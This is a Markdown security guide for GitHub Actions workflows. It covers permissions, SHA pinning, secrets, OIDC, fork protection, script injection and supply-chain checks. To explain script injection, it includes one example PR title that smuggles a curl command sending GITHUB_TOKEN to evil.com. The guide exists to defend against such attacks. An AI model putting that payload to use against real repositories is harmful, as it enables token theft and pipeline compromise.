## Permissions Model

### Always declare explicit permissions

Every workflow MUST have a `permissions:` block. Without it, the
`GITHUB_TOKEN` gets overly broad default permissions.

```yaml
# Workflow-level: least privilege baseline
permissions:
  contents: read
```

### Permission scope reference

| Permission | When to Grant `read` | When to Grant `write` |
|-----------|---------------------|----------------------|
| `contents` | Almost always (checkout) | Pushing commits, creating releases |
| `pull-requests` | Reading PR metadata | Commenting on PRs, updating PR status |
| `issues` | Reading issues | Creating/closing issues |
| `packages` | Pulling container images | Pushing container images to GHCR |
| `id-token` | Never (not applicable) | OIDC cloud authentication |
| `attestations` | Never | Creating artifact attestations |
| `actions` | Reading workflow status | Triggering other workflows |
| `checks` | Reading check results | Creating/updating check runs |
| `deployments` | Reading deployments | Creating deployments |
| `statuses` | Reading commit statuses | Updating commit statuses |
| `security-events` | Reading security alerts | Uploading SARIF files |

### Common permission patterns

**CI workflow (lint, test, build):**
```yaml
permissions:
  contents: read
```

**PR commenting (coverage reports, bot comments):**
```yaml
permissions:
  contents: read
  pull-requests: write
```

**Container publishing (GHCR):**
```yaml
permissions:
  contents: read
  packages: write
```

**Release creation:**
```yaml
permissions:
  contents: write
```

**OIDC cloud deployment:**
```yaml
permissions:
  contents: read
  id-token: write
```

**Artifact attestation:**
```yaml
permissions:
  contents: read
  id-token: write
  attestations: write
```

### Job-level permissions

Use job-level permissions when different jobs need different scopes:

```yaml
permissions:
  contents: read  # Workflow default: minimal

jobs:
  test:
    runs-on: ubuntu-latest
    # Inherits workflow permissions (contents: read)
    steps: [...]

  deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write  # Only this job needs OIDC
    steps: [...]
```

## Action Pinning

### The rule: Always pin to full SHA

```yaml
# WRONG — tag can be moved by the action maintainer (or attacker)
uses: actions/checkout@v4

# WRONG — branch is mutable
uses: actions/checkout@main

# CORRECT — immutable SHA reference
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

### Why SHA pinning matters

Tags and branches are mutable Git references. A compromised action maintainer
(or an attacker who gains access) can move a tag to point at malicious code.
SHA references are immutable — they always point to the exact same code.

### How to find the SHA for an action

1. Go to the action's GitHub repository
2. Navigate to Releases
3. Find the desired version tag
4. Click the tag's commit hash
5. Copy the full 40-character SHA

### Inline version comments

Always add the version tag as an inline comment for readability:

```yaml
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

This makes it easy to see which version is pinned without looking up the SHA.

## Secret Management

### Secret hierarchy

| Scope | When to Use | Access |
|-------|------------|--------|
| **Repository secrets** | Single-repo credentials | All workflows in repo |
| **Environment secrets** | Per-environment credentials | Only jobs targeting that environment |
| **Organization secrets** | Shared across repos | Selected repositories |

### Best practices

1. **Use environment secrets for deploy credentials:**
   ```yaml
   jobs:
     deploy:
       environment: production
       # Secrets are only available after environment approval
       steps:
         - run: deploy --token ${{ secrets.DEPLOY_TOKEN }}
   ```

2. **Never print secrets in logs:**
   GitHub masks secrets automatically, but avoid debugging patterns that
   could expose them:
   ```yaml
   # WRONG — might expose secret in error output
   run: echo ${{ secrets.TOKEN }}

   # WRONG — set -x will print commands including secrets
   run: |
     set -x
     curl -H "Authorization: ${{ secrets.TOKEN }}" ...

   # CORRECT — use environment variable
   env:
     TOKEN: ${{ secrets.TOKEN }}
   run: curl -H "Authorization: $TOKEN" ...
   ```

3. **Prefer `GITHUB_TOKEN` over PATs:**
   The built-in `GITHUB_TOKEN` is scoped to the repository and automatically
   expires. Use it instead of Personal Access Tokens when possible:
   ```yaml
   # GOOD — uses built-in token
   env:
     GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

   # AVOID — requires manual rotation, broader scope
   env:
     GH_TOKEN: ${{ secrets.MY_PAT }}
   ```

4. **Use OIDC instead of long-lived credentials:**
   See [OIDC section](#oidc-for-cloud-authentication) below.

## OIDC for Cloud Authentication

### Why OIDC

Instead of storing long-lived cloud credentials (AWS access keys, GCP service
account keys) as secrets, use OpenID Connect (OIDC) to get short-lived tokens
directly from the cloud provider. Benefits:

- No long-lived secrets to rotate
- Tokens expire automatically (typically 1 hour)
- Cloud provider can restrict which workflows get tokens
- Audit trail through cloud provider logs

### AWS OIDC

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - name: Configure AWS credentials
    uses: aws-actions/configure-aws-credentials@<SHA>  # v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
      aws-region: us-east-1
      # No access key or secret key needed
```

**AWS IAM trust policy** (configure in AWS):
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:org/repo:*"
        }
      }
    }
  ]
}
```

### GCP OIDC

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - name: Authenticate to GCP
    uses: google-github-actions/auth@<SHA>  # v2
    with:
      workload_identity_provider: projects/123456/locations/global/workloadIdentityPools/github/providers/my-repo
      service_account: github-actions@my-project.iam.gserviceaccount.com
```

### Azure OIDC

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - name: Azure Login
    uses: azure/login@<SHA>  # v2
    with:
      client-id: ${{ secrets.AZURE_CLIENT_ID }}
      tenant-id: ${{ secrets.AZURE_TENANT_ID }}
      subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
```

## Fork Protection

### The threat model

When a PR is opened from a fork, the workflow runs in the context of the
fork. By default:

- `GITHUB_TOKEN` has **read-only** access
- **Repository secrets are NOT available**
- This is a security feature — untrusted code shouldn't access secrets

### Dangerous patterns

```yaml
# DANGEROUS — pull_request_target runs with base repo privileges
# If you also checkout the PR branch, the PR author's code runs with secrets
on: pull_request_target

steps:
  - uses: actions/checkout@<SHA>
    with:
      ref: ${{ github.event.pull_request.head.sha }}
      # THIS IS DANGEROUS — untrusted PR code now has secret access
```

### Safe patterns

```yaml
# SAFE — pull_request events don't have access to secrets from forks
on: pull_request

# SAFE — pull_request_target WITHOUT checking out PR code
on: pull_request_target
steps:
  - uses: actions/checkout@<SHA>
    # Default: checks out BASE branch (safe), not the PR branch
  - name: Label PR
    # Only metadata operations, no running PR code
```

### Fork-safe workflow design

1. **Use `pull_request`** (not `pull_request_target`) for CI
2. **Never checkout PR code in `pull_request_target`** workflows
3. **Use `pull_request_target`** only for metadata operations (labeling,
   commenting) that don't run PR code
4. **Gate secret-requiring jobs** behind `if: github.event.pull_request.head.repo.full_name == github.repository`

## Script Injection Prevention

### The vulnerability

GitHub expressions `${{ }}` are evaluated BEFORE the shell script runs.
Untrusted input injected into a `run:` block can execute arbitrary commands.

```yaml
# VULNERABLE — attacker controls PR title
- run: echo "PR title is ${{ github.event.pull_request.title }}"
# An attacker could set title to: "; curl http://evil.com/steal?token=$GITHUB_TOKEN"
```

### Untrusted inputs (never use directly in `run:`)

| Context | Why Untrusted |
|---------|--------------|
| `github.event.pull_request.title` | PR author controls it |
| `github.event.pull_request.body` | PR author controls it |
| `github.event.issue.title` | Issue author controls it |
| `github.event.issue.body` | Issue author controls it |
| `github.event.comment.body` | Comment author controls it |
| `github.event.review.body` | Reviewer controls it |
| `github.event.pull_request.head.ref` | Branch name, controlled by author |
| `github.event.commits[*].message` | Commit message, controlled by author |
| `github.event.commits[*].author.email` | Author email, controlled |

### Safe pattern: Use environment variables

```yaml
# SAFE — untrusted input goes through env variable, not shell expansion
- name: Process PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title is $PR_TITLE"
```

### Safe pattern: Use `github-script` for complex logic

```yaml
- name: Process untrusted input
  uses: actions/github-script@<SHA>  # v7
  with:
    script: |
      const title = context.payload.pull_request.title;
      // JavaScript string, no shell injection possible
      console.log(`PR title: ${title}`);
```

### Safe contexts (OK to use directly)

| Context | Why Safe |
|---------|---------|
| `github.sha` | Hex hash, no special characters |
| `github.ref_name` | For push events on own repo |
| `github.run_id` | Numeric |
| `github.run_number` | Numeric |
| `github.repository` | Own repo name |
| `github.actor` | GitHub username (validated) |
| `runner.os` | Fixed set of values |

## Supply Chain Security

### Dependabot for actions

Always configure Dependabot to update GitHub Actions:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    groups:
      actions:
        patterns:
          - "*"
```

### Artifact attestations

For high-security environments, add build provenance attestations:

```yaml
permissions:
  id-token: write
  attestations: write
  contents: read

steps:
  - name: Build
    run: make build

  - name: Attest build provenance
    uses: actions/attest-build-provenance@<SHA>  # v2
    with:
      subject-path: "dist/my-artifact"
```

Verify attestations with:
```bash
gh attestation verify dist/my-artifact -o my-org
```

### CODEOWNERS for workflow files

Protect workflow files from unauthorized changes:

```
# .github/CODEOWNERS
.github/ @org/platform-team
```

### OpenSSF Scorecard

For public repositories, consider adding the OpenSSF Scorecard workflow
to assess supply chain security practices.

## Environment Protection

### Environment setup

Configure environments in GitHub repository settings (Settings → Environments):

| Environment | Protection Rules |
|-------------|-----------------|
| `staging` | None (auto-deploy) or branch restriction to `main` |
| `production` | Required reviewers + branch restriction to `main` |

### Workflow usage

```yaml
jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.example.com
    steps:
      - name: Deploy
        run: deploy --env staging
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
          # This secret is environment-specific

  deploy-production:
    runs-on: ubuntu-latest
    needs: deploy-staging
    environment:
      name: production
      url: https://example.com
    steps:
      - name: Deploy
        run: deploy --env production
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
          # Different secret value than staging
```

### Environment protection rules

| Rule | Purpose |
|------|---------|
| **Required reviewers** | Manual approval before deploy |
| **Wait timer** | Delay between approval and deploy (cooldown) |
| **Deployment branches** | Restrict which branches can deploy |
| **Custom rules** | Integrate external approval systems |

## Security Checklist

Apply this checklist to every workflow before delivery.

### Critical (must fix)
- [ ] `permissions:` declared at workflow or job level
- [ ] All actions pinned to full SHA
- [ ] No untrusted input used directly in `run:` blocks
- [ ] No hardcoded credentials in workflow files
- [ ] Secrets not exposed to fork PRs

### High (should fix)
- [ ] `GITHUB_TOKEN` used instead of PAT where possible
- [ ] OIDC used for cloud auth instead of long-lived keys
- [ ] Environment secrets used for deploy credentials (not repo secrets)
- [ ] `pull_request_target` not used (or used safely without PR checkout)
- [ ] Dependabot configured for github-actions ecosystem

### Medium (recommended)
- [ ] CODEOWNERS protects `.github/` directory
- [ ] Branch protection requires CI to pass
- [ ] Environment protection rules for production
- [ ] Artifact attestations for published binaries/images
- [ ] Concurrency groups prevent parallel deploys to same environment

### Low (nice to have)
- [ ] OpenSSF Scorecard for public repositories
- [ ] actionlint in CI or pre-commit
- [ ] Workflow-level `env:` avoids repeating secrets in steps
